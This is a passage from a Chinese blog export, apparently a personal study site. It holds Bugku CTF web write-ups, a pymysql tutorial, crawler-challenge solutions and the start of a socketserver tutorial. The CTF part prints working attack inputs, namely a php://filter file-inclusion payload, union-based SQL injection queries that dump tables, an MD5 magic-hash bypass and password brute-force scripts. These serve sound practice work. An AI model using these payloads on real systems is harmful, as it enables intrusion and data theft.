'%61%61%36%34%38%63%66%36%65%38%37%61%37%31%31%34%66%31%22%3d%3d%61%2e%76%61%6c%75%65%29%72%65%74%75%72%6e%21%30%3b%61%6c%65%72%74%28%22%45%72%72%6f%72%22%29%3b%61%2e%66%6f%63%75%73%28%29%3b%72%65%74%75%72%6e%21%31%7d%7d%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%42%79%49%64%28%22%6c%65%76%65%6c%51%75%65%73%74%22%29%2e%6f%6e%73%75%62%6d%69%74%3d%63%68%65%63%6b%53%75%62%6d%69%74%3b';eval(unescape(p1) + unescape('%35%34%61%61%32' + p2));&lt;/script&gt; 解码后： 123var p1 = 'function checkSubmit()&#123;var a=document.getElementById(\"password\");if(\"undefined\"!=typeof a)&#123;if(\"67d709b2b';var p2 = 'aa648cf6e87a7114f1\"==a.value)return!0;alert(\"Error\");a.focus();return!1&#125;&#125;document.getElementById(\"levelQuest\").onsubmit=checkSubmit;';eval(unescape(p1)+unescape('54aa2'+p2)); 拼接后eval函数执行的语句： 1234567891011121314&lt;script&gt; function checkSubmit()&#123; var a = document.getElementById(\"password\"); if(\"undefined\" != typeof a)&#123; if(\"67d709b2b54aa2aa648cf6e87a7114f1\" == a.value)&#123; return !0; &#125; alert(\"Error\"); a.focus(); return !1; &#125; &#125; document.getElementById(\"levelQuest\").onsubmit = checkSubmit();&lt;/script&gt; 大致逻辑就是输入拼接后的password：67d709b2b54aa2aa648cf6e87a7114f1得到flag flag在index里网址：http://120.24.86.145:8005/post/ 点击链接，发现跳转到?file=show.php，猜测是文件包含漏洞 根据题目提示，利用php内置协议读取index.php内容 输入?file=php://filter/read=convert.base64-encode/resource=index.php 得到一串base64加密的字符串，解密得index.php内容： 123456789101112131415&lt;html&gt; &lt;title&gt;Bugku-ctf&lt;/title&gt; &lt;?php error_reporting(0); if(!$_GET[file])&#123;echo &apos;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&apos;;&#125; $file=$_GET[&apos;file&apos;]; if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123; echo &quot;Oh no!&quot;; exit(); &#125; include($file); //flag:flag&#123;edulcni_elif_lacol_si_siht&#125;?&gt;&lt;/html&gt; 成功得到flag，同时可以看到过滤了关键词../,input,data 输入密码查看flag网址：http://120.24.86.145:8002/baopo/ 提示我们输入正确的5位密码就能查看到flag，根据提示，直接写个脚本爆破密码就行，代码如下： 12345678910111213141516171819202122import requestsurl = 'http://120.24.86.145:8002/baopo/'pwd = '0'while True: if len(pwd) != 5 : add = 5 - len(pwd) addstr = '' for i in range(add): addstr = '0' + addstr pwd = addstr + pwd data = &#123; 'pwd':pwd &#125; r = requests.post(url,data=data) r.encoding = r.apparent_encoding if '密码不正确' not in r.text: print(pwd,': correct password!!!!!!!') break else: print(pwd,': wrong password') pwd = str(int(pwd)+1) 爆破出的密码是13579 点击一百万次网址：http://120.24.86.145:9001/test/ 看提示是要点击一百万次才能拿到flag 仔细看看源代码的js部分 1234567if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action=\"\" method=\"post\"&gt;' + '&lt;input type=\"text\" name=\"clicks\" value=\"' + clicks + '\" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; 可以看出当我们点击一百万次时会自动提交一个表单给服务器 那么我们可以直接发送POST请求提交参数clicks给服务器 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162&gt;&gt;&gt; import requests&gt;&gt;&gt; url = 'http://120.24.86.145:9001/test/'&gt;&gt;&gt; data = &#123; 'clicks':1000000 &#125;&gt;&gt;&gt; r = requests.post(url,data=data)&gt;&gt;&gt; r.encoding = r.apparent_encoding&gt;&gt;&gt; print(r.text)&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;style&gt; h1&#123; color: white; text-align: center; &#125; body&#123; background-color: black; &#125; img&#123; display: block; margin: 0 auto; &#125; #flag&#123; color: white; text-align: center; display: block; &#125; &lt;/style&gt; &lt;head&gt; &lt;meta charset=\"utf-8\" &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1\"&gt; &lt;script src=\"jquery-3.2.1.min.js\"&gt;&lt;/script&gt; &lt;title&gt;点击一百万次&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1 id=\"goal\"&gt;Goal: &lt;span id=\"clickcount\"&gt;0&lt;/span&gt;/1000000&lt;/h1&gt; &lt;img id=\"cookie\" src=\"cookie.png\"&gt; &lt;span id=\"flag\"&gt;flag&#123;Not_C00kI3Cl1ck3r&#125;&lt;/span&gt; &lt;/body&gt; &lt;script&gt; var clicks=0 $(function() &#123; $(\"#cookie\") .mousedown(function() &#123; $(this).width('350px').height('350px'); &#125;) .mouseup(function() &#123; $(this).width('375px').height('375px'); clicks++; $(\"#clickcount\").text(clicks); if(clicks &gt;= 1000000)&#123; var form = $('&lt;form action=\"\" method=\"post\"&gt;' + '&lt;input type=\"text\" name=\"clicks\" value=\"' + clicks + '\" hidden/&gt;' + '&lt;/form&gt;'); $('body').append(form); form.submit(); &#125; &#125;); &#125;); &lt;/script&gt;&lt;/html&gt; 拿到了flag:flag{Not_C00kI3Cl1ck3r} 备份是个好习惯网址：http://120.24.86.145:8002/web16/ 进入页面只有一串看似加密过的长文d41d8cd98f00b204e9800998ecf8427ed41d8cd98f00b204e9800998ecf8427e 尝试各种解密方法都不行，源代码也没有提示什么 回到题目名字：备份 经过查询得知 ：备份文件一般情况是在后缀名后加的.swp，.bak 于是输入url：http://120.24.86.145:8002/web16/index.php.bak 发现下载了备份文件，用编辑器打开 发现php代码： 123456789101112131415161718192021&lt;?php/** * Created by PhpStorm. * User: Norse * Date: 2017/8/6 * Time: 20:22*/include_once &quot;flag.php&quot;;ini_set(&quot;display_errors&quot;, 0);$str = strstr($_SERVER[&apos;REQUEST_URI&apos;], &apos;?&apos;);$str = substr($str,1);$str = str_replace(&apos;key&apos;,&apos;&apos;,$str);parse_str($str);echo md5($key1);echo md5($key2);if(md5($key1) == md5($key2) &amp;&amp; $key1 !== $key2)&#123; echo $flag.&quot;取得flag&quot;;&#125;?&gt; 看起来要绕过过滤拿到flag 先了解全局变量$_SERVER[‘REQUEST_URI’]它代表访问页面的URI 例子： 123456&lt;?php$a = $_SERVER['REQUEST_URI'];echo $a;?&gt; 结果： 所以本题的$_SERVER[‘REQUEST_URI’]值为/web16/index.php?… 再经过strstr函数返回?后面的字符串，也就是get的参数 再通过substr函数返回各个参数，然后再通过str_replace函数将字符串中的’key’过滤 处理后再经由parse_str函数将查询字符串解析到变量中 如处理字符串”key1=1&amp;key2=2”，则创建变量key1=1,变量key2=2 然后判断如果变量key1和key2值不完全相等且md5加密后的两个值相等，则输出flag值 绕过str_replace函数方法很简单，双写即可绕过，md5加密后相等但本身不相等的两个值为240610708 和QNKCDZO 于是访问http://120.24.86.145:8002/web16/index.php?kkeyey1=240610708&amp;kkeyey2=QNKCDZO 拿到flag 成绩单网址：http://120.24.86.145:8002/chengjidan/ 提交表单参数id=1,2,3时返回不同结果，提交id=1’无返回结果，明显存在sql注入漏洞 爆查询字段数：输入id=1’ order by 4 #有返回结果，输入id=1’ order by 5#无返回结果 所以查询字段数为4 爆当前库：输入id=0’ union select database(),2,3,4# 当前库名为skctf_flag 爆当前库下的表名：输入id=0’ union select group_concat(table_name),2,3,4 from information_schema.tables where table_schema=database()# 表名为fl4g,sc 爆fl4g表下的列名：输入id=0’ union select group_concat(column_name),2,3,4 from information_schema.columns where table_name=’fl4g’# 列名为skctf_flag 爆数据：输入id=0’ union select group_concat(skctf_flag),2,3,4 from skctf_flag.fl4g# 拿到flag 秋名山老司机网址：http://120.24.86.145:8002/qiumingshan/ 要求我们post一个value参数，值为页面的一串公式的计算结果，且每两秒会刷新一个新的公式 只能写脚本，代码如下： 123456789101112131415161718import requestsimport reurl = 'http://120.24.86.145:8002/qiumingshan/'s = requests.Session()while True: r = s.get(url) match = re.search(r'&lt;div&gt;(.*)=',r.text) result = eval(match.group(1)) data = &#123; 'value':str(result) &#125; r = s.post(url,data=data) match = re.search(r'&lt;div&gt;(.*)=',r.text) if not match: print(r.text) break print(r.text) 这里利用正则匹配出公式，利用eval函数计算出结果 测试得一定概率才能获得flag 速度要快网址：http://120.24.86.145:8002/web6/ 源代码提示post一个正确的margin参数给服务器就能拿到flag 用burp抓包发现响应头包含了flag字段，并且每次响应的flag字段值都不一样，猜测就是提交这个flag值 第一次的代码： 123456789101112import requestsurl = 'http://120.24.86.145:8002/web6/'s = requests.Session()r = s.get(url)flag = r.headers['flag']print('flag:',flag)data = &#123; \"margin\": flag&#125;r = s.post(url,data=data)print(r.text) 结果： 发现不对，才发现还需要将flag字段值进行base64解码 第二次的代码： 1234567891011121314import requestsimport base64url = 'http://120.24.86.145:8002/web6/'s = requests.Session()r = s.get(url)flag = r.headers['flag']flag = bytes.decode(base64.b64decode(flag)).split(':')[1]print('flag:',flag)data = &#123; \"margin\": flag&#125;r = s.post(url,data=data)print(r.text) 结果： 还是不对，借鉴了别人的代码才发现还得对上面的flag在进行一次base64解码，真是坑… 最后的代码： 1234567891011121314import requestsimport base64url = 'http://120.24.86.145:8002/web6/'s = requests.Session()r = s.get(url)flag = bytes.decode(base64.b64decode(r.headers['flag'])).split(':')[1]flag = bytes.decode(base64.b64decode(flag))print('flag:',flag)data = &#123; 'margin':flag &#125;r = s.post(url,data=data)print(r.text) 结果：","categories":[{"name":"Bugkuctf-Web","slug":"Bugkuctf-Web","permalink":"https://Foxgrin.github.io/categories/Bugkuctf-Web/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://Foxgrin.github.io/tags/ctf/"}]},{"title":"Python数据库编程","slug":"Python数据库编程","date":"2018-07-28T09:30:00.000Z","updated":"2018-07-28T13:21:09.556Z","comments":true,"path":"/posts/21317/","link":"","permalink":"https://Foxgrin.github.io/posts/21317/","excerpt":"Python中的第三方库pymysql提供了与数据库连接并且进行交互的功能","text":"Python中的第三方库pymysql提供了与数据库连接并且进行交互的功能 pymysql库的安装1pip install pymysql pymysql库的使用(1)导入pymysql库 1import pymysql (2)使用pymysql.connect()方法创建python客户端与数据库连接的connection对象 1conn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root') connect方法中的参数： 1)host：字符串类型，表示mysql服务器地址 2)port：数字类型，表示mysql服务器端口号，默认为3306 3)user：字符串类型，表示mysql数据库用户名 4)passwd：字符串类型，表示mysql数据库密码 5)db：字符串类型，表示连接到的数据库名 6)charset：字符串类型，表示连接编码 (3)使用connection对象的cursor()方法创建于数据库交互的对象 1cur = conn.cursor() (4)使用cursor对象的execute()方法执行sql语句 12sql = ''row = cur.execute() #返回查询结果的行数 (5)使用cursor对象的fetchone,fetchmany,fetchall方法获得查询结果 1result = cur.fetchone() #取得结果集的下一行 例子： 1234567891011&gt;&gt;&gt; import pymysql&gt;&gt;&gt; conn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')&gt;&gt;&gt; cur = conn.cursor()&gt;&gt;&gt; sql = 'show databases'&gt;&gt;&gt; row = cur.execute(sql)&gt;&gt;&gt; result = cur.fetchone()&gt;&gt;&gt; print(result)('information_schema',)&gt;&gt;&gt; result = cur.fetchone()&gt;&gt;&gt; print(result)('mysql',) 1result = cur.fetchmamy(size) #取得结果集的下几行 例子： 1234567891011&gt;&gt;&gt; import pymysql&gt;&gt;&gt; conn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')&gt;&gt;&gt; cur = conn.cursor()&gt;&gt;&gt; sql = 'show databases'&gt;&gt;&gt; row = cur.execute(sql)&gt;&gt;&gt; result = cur.fetchmany(2)&gt;&gt;&gt; print(result)(('information_schema',), ('mysql',))&gt;&gt;&gt; result = cur.fetchmany(2)&gt;&gt;&gt; print(result)(('performance_schema',), ('security',)) 1result = cur.fetchall() #取得结果集的所有行 例子： 12345678&gt;&gt;&gt; import pymysql&gt;&gt;&gt; conn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')&gt;&gt;&gt; cur = conn.cursor()&gt;&gt;&gt; sql = 'show databases'&gt;&gt;&gt; row = cur.execute(sql)&gt;&gt;&gt; result = cur.fetchall()&gt;&gt;&gt; print(result)(('information_schema',), ('mysql',), ('performance_schema',), ('security',), ('test',)) (6)使用cursor对象的commit()方法将修改提交到数据库 1cur.commit() (7)关闭cursor对象和connection对象 12cur.close()conn.close() 使用pymysql库实现数据库的增删改查(1)创建新的数据库pymysql，并且创建新的数据表demo，列名分别为id,username,password 123456789101112131415161718192021222324import pymysqlconn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')cur = conn.cursor()createdb_sql = 'create database pymysql'cur.execute(createdb_sql)querydb_sql = 'show databases'cur.execute(querydb_sql)result = cur.fetchall()if ('pymysql',) in result: print('Database has created successfully!')selectdb_sql = 'use pymysql'cur.execute(selectdb_sql)createtb_sql = 'create table demo(id int(3),username varchar(20),password varchar(20))'cur.execute(createtb_sql)querytb_sql = 'show tables'cur.execute(querytb_sql)result = cur.fetchall()if ('demo',) in result: print('Table has created successfully!') 运行结果： mysql命令行中查询： (2)向demo表中添加修改数据 1234567891011121314151617181920212223242526272829import pymysqlconn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root')cur = conn.cursor()selectdb_sql = 'use pymysql'cur.execute(selectdb_sql)data = [[1,'admin1','admin1'],[2,'admin2','admin2'],[3,'admin3','admin3']]for i in data: ID = i[0] username = i[1] password = i[2] insert_sql = \"insert into demo values(%d,'%s','%s')\"%(ID,username,password) cur.execute(insert_sql)query_sql = 'select * from demo'cur.execute(query_sql)result = cur.fetchall()print(result)update_sql = \"update demo set username='somnus',password='somnus' where id=3\"cur.execute(update_sql)cur.execute(query_sql)result = cur.fetchall()print(result)cur.close()conn.close() 运行结果： (3)删除列，表，库 123456789101112131415161718192021222324import pymysqlconn = pymysql.connect(host='localhost',port=3306,user='root',passwd='root',db='pymysql')cur = conn.cursor()deletecu_sql = \"delete from demo where id=1\"cur.execute(deletecu_sql)query_sql = 'select * from demo where id=1'if cur.execute(query_sql) == 0: print('column 1 has deleted')deletetb_sql = \"drop table demo\"cur.execute(deletetb_sql)query_sql = 'show tables'if cur.execute(query_sql) == 0: print('table has deleted')deletedb_sql = \"drop database pymysql\"cur.execute(deletedb_sql)query_sql = 'show databases'cur.execute(query_sql)result = cur.fetchall()if ('pymysql',) not in result: print('database has deleted')","categories":[{"name":"Python学习笔记","slug":"Python学习笔记","permalink":"https://Foxgrin.github.io/categories/Python学习笔记/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"黑板客爬虫闯关(1-5)","slug":"黑板客爬虫闯关(1~5)","date":"2018-07-26T08:34:00.000Z","updated":"2018-07-26T14:40:26.906Z","comments":true,"path":"/posts/18564/","link":"","permalink":"https://Foxgrin.github.io/posts/18564/","excerpt":"昨天偶然间发现了一个爬虫的闯关网站，就赶紧来用它练一练爬虫，今天总算是将五个关卡都通关了，其中也碰到不少坑，通过百度借鉴别人的思路代码也都慢慢解决了，学到了很多，下面就附上五个关卡的思路和代码","text":"昨天偶然间发现了一个爬虫的闯关网站，就赶紧来用它练一练爬虫，今天总算是将五个关卡都通关了，其中也碰到不少坑，通过百度借鉴别人的思路代码也都慢慢解决了，学到了很多，下面就附上五个关卡的思路和代码 Pass-1网址：http://www.heibanke.com/lesson/crawler_ex00/ 首先页面给的提示是要我们在网址后面输入数字73618 访问http://www.heibanke.com/lesson/crawler_ex00/73618/ 页面又提示要输入数字53825 访问http://www.heibanke.com/lesson/crawler_ex00/53825/ 又提示要输入数字，于是推测这关要一直输入到某个数字后才能得到最后结果 那么我们可以将每个提示页面的数字，即下一个要输入的数字爬取下来，与原来的url构成一个下一个要访问的url，再继续爬取数字，假如爬取不到数字，就猜测可能得到了最后的结果 代码如下： 123456789101112131415import requestsimport reurl = 'http://www.heibanke.com/lesson/crawler_ex00/'num = ''while True: next_url = url+num print(next_url) r = requests.get(next_url) match = re.search(r'数字.*(\\d&#123;5&#125;)',r.text) if not match: print('You have found the last number!') print('The last number is:',str(num)) break num = match.group(1) 这里通过正则匹配出下一个要输入的数字，然后与网页原本的url拼成下一个要访问的url，当匹配不到数字时退出循环 运行结果： 猜测69428是最后输入的数字，我们访问一下http://www.heibanke.com/lesson/crawler_ex00/69428/ 果然，页面提示了通关，点击下一关按钮，进入到第二关的页面 Pass-2网址：http://www.heibanke.com/lesson/crawler_ex01/ 首先根据页面提示，我们需要在表单中输入一个用户名和密码，用户名可以随机输入，密码则是1到30之间的数字 我们先来看一下源代码中的表单部分 可以看出表单是以POST形式提交的，提交的参数为username和password，还会提交一个隐藏的token值，看到token值，我们的第一反应都是要先获取到页面的token值，与数据一起提交，但是经过测试，这关后台服务器并没有对token值进行检测，也就是说我们在程序中并不需要提交这个token值，也可以提交成功，既然不用管token，那么这关就很简单了 我们先随意提交一个用户名aaa和密码1看看提示是什么 可以看到页面提示”您输入的密码错误”，说明这是输入错误的提示信息，那么思路就很清晰了，我们依次提交数值为1-30之间的密码值，然后根据页面的提示信息是否包含”您输入的密码错误”，如果没有则可能是正确的密码 代码如下： 123456789101112131415import requestsurl = 'http://www.heibanke.com/lesson/crawler_ex01/'for i in range(1,31): data = &#123; 'username':'aaa', 'password':i, 'submit':'提交' &#125; r = requests.post(url,data=data) if '您输入的密码错误' not in r.text: print('Correct password:',str(i)) break else: print('Wrong password:',str(i)) 运行结果： 说明20可能是正确的密码，我们在浏览器中提交 闯关成功，继续点击下一关按钮进入第三关 Pass-3网址：http://www.heibanke.com/lesson/crawler_ex02/ 我们会发现自动跳转到了登录页面，也就是说这一关需要模拟登录 我们先注册一个账号和密码登录进去 看起来和上一关没什么区别，一样是输入用户名和密码，用户名是随意的，密码还是1-30之间的数字，唯一区别在于页面提示比上一关多了两层保护，光看这句话还是很懵逼的，没事，我们看一看页面源代码，就可以大致猜到到底是什么保护了 可以看出表单提交了隐藏的token值，猜测这关服务器会对token值进行检测 再回到登录页面，查看源代码的表单部分 登录页面也有一个token值 所以思路是这样的，我们首先需要模拟登录，这就需要用到requests库的Session方法保持一个会话记录，否则我们再次访问这关的页面依旧会跳转到登录页面，然后我们还需要爬取页面信息的token值，也就是提交token的input标签的value值 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839import requestsfrom bs4 import BeautifulSouplogin_url = 'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex02/'pass_url = 'http://www.heibanke.com/lesson/crawler_ex02/'s = requests.Session()def getToken(html): soup = BeautifulSoup(html,'html.parser') token = soup.find_all('input')[0]['value'] return tokendef login(): r = s.get(url=login_url) login_token = getToken(r.text) login_data = &#123; 'csrfmiddlewaretoken':login_token, 'username':'xxx', #替换成自己的用户名 'password':'xxx' #替换成自己的密码 &#125; login = s.post(url=login_url,data=login_data) if '这里是黑板客爬虫闯关的第三关' in login.text: print('login successfully!') pass_token = getToken(login.text) return pass_token pass_token = login()for i in range(31): data = &#123; 'csrfmiddlewaretoken':pass_token, 'username':'aaa', 'password':i &#125; result = s.post(url=pass_url,data=data) if '您输入的密码错误' not in result.text: print('------Correct password:',str(i)) break else: print('fail to pass') 这里用了BeautifulSoup库的find_all方法获得所有input标签组成的列表，观察出token值所在的input标签是列表的第一个元素，就可以通过索引获得token值，登录成功后还要继续抓取关卡页面的token值，与用户名和密码一起提交 最后的运行结果如下： 在浏览器中提交用户名：aaa，密码：4 闯关成功，此处后台代码有误，点击下一关还是第三关的页面，但是我们可以根据前面几关的url推测出第四关的url：http://www.heibanke.com/lesson/crawler_ex03/ Pass-4网址：http://www.heibanke.com/lesson/crawler_ex03/ 跟第三关一样，还是需要先登录 登录后来到第四关关卡页面 页面提示”密码很长，是试不出来的，需要找出来”，看一下源代码，还是跟第二关第三关一样，提交username和password参数，服务器有对token值进行检测 但是还是没有关于密码的提示部分信息 怎么办呢，我们先试一下随便输入一个密码1，看看页面返回什么 惊喜的发现提示来了，我们点击”在这里耐心找”访问到提示页面(PS：这个页面有点慢，需要耐心等待加载) 仔细观察，会发现这里提示信息是给出了一共100位的密码，其中每一位的值，而且每一页显示的位数还会变化，所以这里要访问所有的页数获取每一位数和对应的值是行不通的，所以我们干脆就一直访问第一页，爬取每一位的位数和对应的值，直到爬取位数共有100为止 直接附上代码吧： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import requestsimport refrom bs4 import BeautifulSouplogin_url = 'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex03/'pass_url = 'http://www.heibanke.com/lesson/crawler_ex03/'hint_url = 'http://www.heibanke.com/lesson/crawler_ex03/pw_list/'s = requests.Session()def getToken(html): soup = BeautifulSoup(html,'html.parser') token = soup.find_all('input')[0]['value'] return tokendef login(): r = s.get(login_url) login_token = getToken(r.text) login_data = &#123; 'csrfmiddlewaretoken':login_token, 'username':'xxx', 'password':'xxx' &#125; login = s.post(url=login_url,data=login_data) if '这里是黑板客爬虫闯关的第四关' in login.text: print('login successfully') pass_token = getToken(login.text) return pass_tokendef getDict(): total_pos = [] passwordDict = &#123;&#125; while True: hint = s.get(url=hint_url) pos = re.findall(r'title=\"password_pos\"&gt;(\\d*)',hint.text) value = re.findall(r'title=\"password_val\"&gt;(\\d*)',hint.text) for i in range(len(pos)): if pos[i] not in total_pos: total_pos.append(pos[i]) passwordDict[pos[i]] = value[i] if len(total_pos) == 100: break else: print(len(total_pos)) print(passwordDict) return passwordDictdef getPassword(dic): passList = [] for i in range(1,101): passList.append(dic[str(i)]) password = ''.join(passList) return passwordpass_token = login()passwordDict = getDict()print(passwordDict)password = getPassword(passwordDict)print(password) 一开始还是跟第三关一样，先获取登录页面的token值，然后登录，页面如果有返回”这里是黑板客爬虫闯关的第四关”的信息说明登录成功，登录成功再获取关卡页面的token值，接下来就获取位置数和对应的值，这里定义了一个列表total_pos用来存放总的位置数和一个字典 passwordDict用来存放位置数及其对应的值，然后不断的访问提示页面的第一页，通过re模块的findall方法匹配出pos和value列表，每次匹配完检查pos列表的每一个元素，如果不在total_pos中，则添加进total_pos中，并将‘pos[i]’:’value[i]’键值对添加进字典中，直到匹配出100位为止，此时就获得了每一位和对应的值，再从第一位开始从字典中取出value值，添加进passList列表中，最后将passList列表元素拼成一个长字符串，就是最后获得的密码 这里过程实在是很慢，总之看脸…脸好很快就爬到了100位 最后获得的字典： 123passwordDict = &#123; '73': '8', '76': '6', '28': '5', '72': '1', '61': '4', '32': '3', '57': '6', '75': '3', '90': '0', '53': '7', '74': '1', '56': '2', '83': '1', '34': '9', '44': '4', '70': '6', '92': '4', '18': '5', '93': '8', '37': '8', '85': '3', '67': '8', '17': '3', '62': '3', '84': '6', '24': '5', '8': '8', '15': '3', '100': '2', '55': '3', '1': '3', '10': '7', '20': '7', '79': '3', '12': '4', '91': '6', '36': '4', '43': '6', '60': '8', '48': '0', '25': '0', '22': '8', '4': '1', '16': '5', '94': '9', '54': '4', '50': '9', '66': '4', '64': '1', '5': '8', '47': '9', '51': '4', '80': '4', '69': '7', '71': '6', '7': '0', '96': '3', '46': '9', '2': '3', '27': '9', '49': '3', '13': '5', '99': '0', '89': '7', '39': '4', '26': '6', '63': '7', '29': '2', '52': '8', '65': '3', '33': '2', '30': '4', '9': '6', '86': '2', '19': '7', '38': '9', '40': '6', '98': '7', '77': '9', '59': '4', '41': '1', '42': '3', '21': '4', '45': '7', '58': '0', '6': '3', '81': '4', '23': '9', '3': '8', '11': '4', '97': '6', '82': '9', '14': '1', '87': '6', '78': '6', '31': '4', '95': '9', '68': '7', '88': '4', '35': '5' &#125; 整理后的密码： 1password = 3381830867445135357748950695244329548946136479903948743260484371348776618136963449163264706489936702 第五关的url依旧要靠猜 Pass-5网址：http://www.heibanke.com/lesson/crawler_ex04/ 依然要登录，很明显这关要提交验证码，观察一下源代码 可以发现这个验证码其实是一个url，点击进去能看到验证码的图片，跟token一样，每次刷新页面，验证码的url都会变化，因此验证码就会一直变化 所以，我们要通这最后一关，就必须要想办法获取这个验证码的值 在Python中，有一个库叫pytesseract，这个库里的image_to_string方法具有识别图片中信息的功能 由于这个库跟requests一样，是第三方库，因此我们需要先安装后才能使用 除了pytesseract库之外，我们还依赖PIL库的Image方法打开一个图片 安装这两个库都可以用pip命令安装 比较关键的是pytesseract库识别验证码还依赖于一个插件Tesseract-OCR ，这个插件我们可以百度搜索tesseract-ocr-setup-3.02.02.exe 下载，这里我使用的是3.02版本，没有碰到什么问题，按照安装提示一步步下载下来，唯一要注意的是要按照默认路径下载，Windows的默认安装路径是C:\\Program Files (x86)\\Tesseract-OCR\\ 这是因为我们下载完后需要在Python文件夹的下的\\Lib\\site-packages\\pytesseract\\pytesseract.py修改源代码中 1tesseract_cmd = 'tesseract' 修改为： 1tesseract_cmd = r'C:\\Program Files (x86)\\Tesseract-OCR\\tesseract.exe' 安装完成后，我们就可以获取验证码了，除了验证码外，我们还要获取三个值：登录界面的token值，关卡界面的token值，关卡界面的captcha_1 值 需要注意的是，我们用pytesseract库虽然可以识别验证码，但并不是百分百正确，所以我们需要对验证码进行校验，经过观察本关的验证码都是四个大小写英文字母，我们可以通过正则匹配进行校验，如果校验失败，则继续识别，直到校验成功，则提交猜测的密码，这里密码从0开始递增猜测 代码如下： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import requestsimport pytesseractimport refrom bs4 import BeautifulSoupfrom PIL import Imagefrom io import BytesIOlogin_url = 'http://www.heibanke.com/accounts/login/?next=/lesson/crawler_ex04/'pass_url = 'http://www.heibanke.com/lesson/crawler_ex04/'s = requests.Session()def getToken(html): soup = BeautifulSoup(html,'html.parser') token = soup.find_all('input')[0]['value'] return tokendef getCaptcha_0(html): soup = BeautifulSoup(html,'html.parser') Captcha_0 = soup.find('input',id=\"id_captcha_0\")['value'] return Captcha_0def login(): r = s.get(url=login_url) login_token = getToken(r.text) login_data = &#123; 'csrfmiddlewaretoken':login_token, 'username':'xxx', 'password':'xxx' &#125; login = s.post(url=login_url,data=login_data) if '这里是黑板客爬虫闯关的第五关' in login.text: print('login successfully!')def getImageURL(html): soup = BeautifulSoup(html,'html.parser') imageURL = 'http://www.heibanke.com'+soup.find('img',class_='captcha')['src'] return imageURLdef getImageCode(): while True: print('--------------------开始识别验证码') pas = s.get(url=pass_url) imageURL = getImageURL(pas.text) image = s.get(url=imageURL) captcha_img = Image.open(BytesIO(image.content)) imageCode = pytesseract.image_to_string(captcha_img) print('验证码识别结果:',imageCode) print('--------------------开始校验验证码') match = re.search(r'^[A-Z | a-z]&#123;4&#125;$',imageCode) if not match: print('验证码:',imageCode,'校验结果识别失败，继续识别') else: print('验证码:',imageCode,'校验成功') mess = (imageCode,pas) break return messdef guess(): password = 0 while True: print('--------------------------------------开始猜测密码') imageCode,pas = getImageCode() pas_token = getToken(pas.text) Captcha_0 = getCaptcha_0(pas.text) data = &#123; 'csrfmiddlewaretoken':pas_token, 'username':'aaa', 'password':password, 'captcha_0':Captcha_0, 'captcha_1':imageCode &#125; g = s.post(url=pass_url,data=data) if '验证码输入错误' in g.text: print('验证码输入错误') elif '您输入的密码错误' in g.text: print('密码:',password,'错误') password +=1 else : print('密码:',password,'正确') print('返回的页面结果:') print(g.text) break login()guess() 这关坑还是很多的，主要是识别校验码的正确率有点低，即使校验结果是四个英文字母，也不一定是正确的验证码，而且密码是随着时间变化的，总之耐心尝试吧，有了思路多尝试最后总是能成功的 最后我的时间段检测到的正确密码： 在浏览器提交密码19 最后附上参考的链接：https://www.jianshu.com/p/f64853b8f7e9","categories":[{"name":"Python爬虫","slug":"Python爬虫","permalink":"https://Foxgrin.github.io/categories/Python爬虫/"}],"tags":[{"name":"Python","slug":"Python","permalink":"https://Foxgrin.github.io/tags/Python/"}]},{"title":"Python网络编程(二)","slug":"Python网络编程(二)","date":"2018-07-24T14:39:00.000Z","updated":"2018-07-25T01:58:14.254Z","comments":true,"path":"/posts/24856/","link":"","permalink":"https://Foxgrin.github.io/posts/24856/","excerpt":"在上篇文章中，我们了解了Python网络编程的基础模块socket，并利用threading模块实现了多线程处理以及模拟了代理的过程，这篇文章了解一下Python中更为实用，功能更加强大的socketserver模块，用法也更为简单，同时我们也试着实现模拟burp抓取http头部","text":"在上篇文章中，我们了解了Python网络编程的基础模块socket，并利用threading模块实现了多线程处理以及模拟了代理的过程，这篇文章了解一下Python中更为实用，功能更加强大的socketserver模块，用法也更为简单，同时我们也试着实现模拟burp抓取http头部 socketserver库python 3是将python 2中的SocketServer库的大写取消，即socketserver库 首先介绍一下socketserver库的五个重要的类： 1.BaseServe：这个类是模块里最基本的类，所有的类源头都来至于这个基类，但是他不是用于实例或使用的 2.TCPServer：这个类用于TCP/ip的socket通讯 3.UDPServer：这个类用于UDP的socket通讯 4.UnixStreamServer 5.UnixDatagramServer :使用的Unix - domain sockets通讯，并且只能Unix平台使用 可能看不太懂，无所谓，我们只需要关心它的基本使用方法即可 (1)首先我们先导入socketserver库，这个就不用多说了 1import socketserver (2)然后我们需要自定义一个类，用这个类来继承socketserver库中的BaseRequestHandler类，然后重写BaseRequestHandler类中的handle方法，其实就是自定义我们通讯的接收与发送过程 123456class MyTCPServer(socketserver.BaseRequestHandler): def handle(self): self.data = self.request.recv(1024) print(bytes.decode(self.data)) self.reply = input('reply: ') self.request.sendall(str.encode(self.reply)) 这里的self.request.recv()和self.request.sendall()其实就相当于我们socket模块中的recv和send方法 (3)接下来我们在主函数中使用socketserver的ThreadingTCPServer方法实例化一个对象server，传入元组(ip,端口)和我们定义的继承类，然后使用serve_forever()来启动服务 123if __name__=='__main__': server = 